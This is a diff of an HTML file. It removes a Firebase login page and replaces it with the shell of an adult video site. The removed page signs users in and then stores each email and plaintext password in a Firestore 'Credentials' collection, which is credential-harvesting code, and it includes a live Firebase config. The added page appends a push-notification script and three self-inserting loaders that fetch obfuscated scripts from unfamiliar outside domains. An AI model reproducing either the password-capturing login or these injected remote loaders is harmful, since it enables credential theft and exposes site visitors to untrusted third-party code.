@@ -1,196 +1,84 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title></title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background: #000;
-      color: #fff;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .auth-container {
-      width: 100%;
-      max-width: 600px;
-      padding: 20px;
-      background: rgba(255,255,255,0.05);
-      border-radius: 10px;
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-    }
-    .auth-row {
-      display: flex;
-      flex-direction: row;
-      gap: 10px;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-    .auth-input {
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      background: rgba(255, 255, 255, 0.2);
-      color: white;
-      flex: 1 1 200px;
-    }
-    .auth-input::placeholder {
-      color: rgba(255, 255, 255, 0.6);
-    }
-    .auth-button {
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      background: #e50914;
-      color: white;
-      cursor: pointer;
-    }
-    .auth-button:hover {
-      background: #b20710;
-    }
-    .reset-button {
-      background: #333;
-    }
-    .reset-button:hover {
-      background: #555;
-    }
-    .status {
-      text-align: center;
-      font-size: 16px;
-      color: lightgreen;
-    }
-  </style>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
-    import {
-      getAuth,
-      signInWithEmailAndPassword,
-      createUserWithEmailAndPassword,
-      sendPasswordResetEmail,
-      signOut,
-      onAuthStateChanged
-    } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-auth.js";
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+<meta name="referrer" content="no-referrer-when-downgrade" />
+<script charset="UTF-8" src="//web.webpushs.com/js/push/079cefe1ac78a4a64e14b687ab5839a9_1.js" async></script>
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Hentairin</title>  
+<link rel="stylesheet" href="style.css">  </head>  
+<body>  <header>  
+  <div class="logo">  
+    <img src="HENTAIRIN.jpg" alt="Logo">    </div>  
+  <div class="search-box">  
+    <input type="text" placeholder="Search...">  
+  </div>  
+</header>  <div class="content">  
+  <div class="video-grid"></div>  
+  <div class="no-results">No results found</div>  
+</div>  <!-- Load scripts at the end -->  <script src="videos.js"></script>  <script src="search.js"></script>  </body>  
+</html>  
+<script>
+(function(qujz){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = qujz || {};
+s.src = "\/\/welldocumented-interview.com\/c\/DS9F6.bK2q5\/lpSGW\/QN9ZNSjZY\/5HNBTpgw1VNri_0q2-Nyjnk\/1\/OdDbUV3g";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+<script>
+(function(vvit){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = vvit || {};
+s.src = "\/\/welldocumented-interview.com\/c.DV9S6jbb2u5sl\/SqWLQh9RNijyYR5qNRTRgk1QOHCE0j2RNvjDks1WOrDJU-5N";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+<script>
+(function(feesh){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = feesh || {};
+s.src = "\/\/villainousordinary.com\/bDX.VxspdBGIlv0\/YxWGcY\/Ce-mH9QuOZCUGlGkqP\/TeYr2fOXTbUD4KNVjcM\/tTNZjIYL5vNXTQg\/2INeAf";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 
-    import {
-      getFirestore,
-      doc,
-      setDoc,
-      serverTimestamp
-    } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
-      authDomain: "rinolski-notifications.firebaseapp.com",
-      projectId: "rinolski-notifications",
-      storageBucket: "rinolski-notifications.appspot.com",
-      messagingSenderId: "355554579853",
-      appId: "1:355554579853:web:3caa961653c0cdc0a359c4",
-      measurementId: "G-WZ84970GST"
-    };
 
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
 
-    async function saveToCredentials(email, password) {
-      try {
-        await setDoc(doc(db, "Credentials", email), {
-          email,
-          password,
-          lastUpdated: serverTimestamp()
-        });
-        console.log("Credentials saved");
-      } catch (err) {
-        console.error("Failed to save credentials:", err);
-      }
-    }
 
-    window.signInOrSignUp = async () => {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value;
-      const status = document.getElementById("status");
 
-      if (!email || !password) {
-        status.textContent = "Please fill in both email and password.";
-        return;
-      }
 
-      let isNewUser = false;
 
-      try {
-        await signInWithEmailAndPassword(auth, email, password);
-        console.log("Signed in");
-      } catch (loginError) {
-        try {
-          await createUserWithEmailAndPassword(auth, email, password);
-          isNewUser = true;
-          console.log("Signed up");
-        } catch (signupError) {
-          status.textContent = "Login or signup failed.";
-          return;
-        }
-      }
 
-      // Save to Firestore every time (or only on signup)
-      await saveToCredentials(email, password);
-      window.location.reload();
-    };
 
-    window.resetPassword = async () => {
-      const email = document.getElementById("email").value.trim();
-      const status = document.getElementById("status");
 
-      if (!email) {
-        status.textContent = "Enter your email to reset password.";
-        return;
-      }
 
-      try {
-        await sendPasswordResetEmail(auth, email);
-        status.textContent = "Password reset email sent.";
-      } catch (error) {
-        status.textContent = "Failed to send reset email.";
-      }
-    };
 
-    window.signOutUser = () => {
-      signOut(auth).then(() => {
-        window.location.reload();
-      });
-    };
 
-    onAuthStateChanged(auth, (user) => {
-      const container = document.getElementById("auth-container");
-      if (user) {
-        container.innerHTML = `
-          <div class="status">Logged in as: ${user.email}</div>
-          <button class="auth-button reset-button" onclick="signOutUser()">Sign Out</button>
-        `;
-      }
-    });
-  </script>
-</head>
-<body>
-  <div class="auth-container" id="auth-container">
-    <div class="auth-row">
-      <input type="email" id="email" class="auth-input" placeholder="Email" autocomplete="email" required />
-      <input type="password" id="password" class="auth-input" placeholder="Password" autocomplete="current-password" required />
-      <button class="auth-button" onclick="signInOrSignUp()">Login</button>
-    </div>
-    <div class="auth-row">
-      <button class="auth-button reset-button" onclick="resetPassword()">Reset Password</button>
-    </div>
-    <div class="status" id="status"></div>
-  </div>
-</body>
-</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
